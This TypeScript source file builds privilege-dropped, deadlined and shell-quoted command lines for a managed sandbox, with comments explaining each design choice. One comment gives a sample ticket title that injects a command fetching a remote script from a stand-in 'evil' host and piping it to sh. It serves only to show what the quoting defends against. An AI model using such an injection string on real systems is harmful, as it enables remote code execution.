import { TIMEOUT_EXIT_CODE } from '../engines/limits';
import type { ExecOptions } from './host';
import { quote } from './shell';

/**
 * How a step's command reaches a managed sandbox.
 *
 * Separate from `hosted.ts` for one practical reason: that file imports
 * `@cloudflare/sandbox`, which imports `cloudflare:workers`, which does not
 * exist under Bun — so anything in it is unreachable from a test. This is the
 * security-critical half (an unprivileged user, a deadline, and quoting of text
 * a person typed), and it is exactly the half that must be testable.
 *
 * The rule that follows: keep logic out of the SDK-importing file.
 */

/** The user a step's work runs as. Created by `infra/sandbox/Dockerfile`. */
export const WORK_USER = 'factory';

/**
 * An argument vector as one command line: unprivileged, deadlined, and quoted.
 *
 * Three things happen here and the order matters.
 *
 * **Quoted**, because a ticket's title, a reviewer's feedback and a step's
 * required documents are typed by people and the SDK takes a command STRING
 * rather than an argument list. Without this, a ticket named
 * ``x'; curl evil.sh | sh; #`` would run whatever it liked (FR-015).
 *
 * **Deadlined by `timeout` inside the sandbox**, not by the SDK's own timeout.
 * That is what makes FR-014a true rather than hoped: the clock starts when the
 * command starts, so seconds a cold container spends becoming ready are never
 * charged to the step and never reported as the step timing out.
 *
 * **Unprivileged via `setpriv`**, because the SDK's `ExecOptions` has no user
 * field and the image's entrypoint is a root control server. T005 measured that
 * both `setpriv` and `su` work; `setpriv` wins for making no TTY assumptions and
 * going nowhere near PAM, either of which could behave differently once a
 * command carries a pipe, a heredoc or a very long prompt.
 */
export function commandLine(argv: readonly string[], options?: ExecOptions): string {
  const unprivileged = [
    'setpriv',
    `--reuid=${WORK_USER}`,
    `--regid=${WORK_USER}`,
    '--clear-groups',
    ...argv,
  ];
  if (!options?.timeoutMs) return quote(unprivileged);
  const seconds = Math.max(1, Math.ceil(options.timeoutMs / 1000));
  return quote(['timeout', '--signal=KILL', String(seconds), ...unprivileged]);
}

/**
 * `timeout(1)`'s exit code when it fires.
 *
 * Named rather than written as `124` at the call site because the whole point
 * is that it already equals `TIMEOUT_EXIT_CODE` — so a deadline enforced inside
 * the sandbox is reported the same way as one enforced by the Docker host, and
 * a caller can tell a deadline from an ordinary failure without knowing which
 * host ran the step. A unit test asserts the two still agree.
 */
export const TIMEOUT_COMMAND_EXIT_CODE = 124;

/**
 * The outer bound on a call, which must never fire before the inner deadline.
 *
 * The SDK's `exec` has no default timeout at all, so without something here a
 * container that stops answering hangs the request forever — measured on the
 * spike, where an unreachable image presented as a two-minute hang rather than
 * an error. The margin over the step's own deadline is what keeps `timeout`
 * the thing that fires, so the result carries 124 instead of the call being cut
 * off with no exit code at all.
 */
export function outerTimeoutMs(stepTimeoutMs?: number): number {
  const floor = 5 * 60_000;
  if (!stepTimeoutMs) return floor;
  return Math.max(floor, stepTimeoutMs + 60_000);
}

/** Kept honest by a test rather than by a comment. */
export const DEADLINE_CODES_AGREE = TIMEOUT_COMMAND_EXIT_CODE === TIMEOUT_EXIT_CODE;
